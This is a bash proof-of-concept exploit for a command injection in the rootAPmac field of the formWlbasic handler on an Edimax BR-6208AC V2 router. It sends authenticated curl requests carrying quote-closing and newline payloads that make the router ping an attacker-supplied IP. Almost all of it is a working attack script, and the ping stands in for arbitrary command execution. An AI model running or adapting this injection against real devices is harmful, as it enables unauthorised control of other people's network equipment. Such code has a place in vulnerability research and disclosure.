#!/bin/bash
# Edimax BR-6208AC V2 (fw 1.03) formWlbasic rootAPmac command injection — PoC
# Semicolon-only filter bypass via quote closing. Non-destructive (ping-back).
# Requires valid admin credentials. Vulnerable path needs doConnectTest=1.
TARGET="${1:-192.168.2.1}"
USERPASS="${2:-admin:1234}"
LHOST="${3:?attacker IP for ping-back, e.g. 192.168.2.10}"

echo "[*] injecting quote-close escape: x'\$(ping -c 3 $LHOST)'y"
curl -s -o /dev/null -w "    http=%{http_code}\n" --max-time 8 -u "$USERPASS" \
     --data-urlencode "doConnectTest=1" \
     --data-urlencode "rootAPmac=x'\$(ping -c 3 $LHOST)'y" \
     "http://$TARGET/goform/formWlbasic"
echo "[*] check $LHOST for ICMP echo requests from $TARGET"

echo "[*] alternative newline escape:"
curl -s -o /dev/null -w "    http=%{http_code}\n" --max-time 8 -u "$USERPASS" \
     --data-urlencode "doConnectTest=1" \
     --data-urlencode "rootAPmac=x'
ping -c 3 $LHOST
'y" \
     "http://$TARGET/goform/formWlbasic"
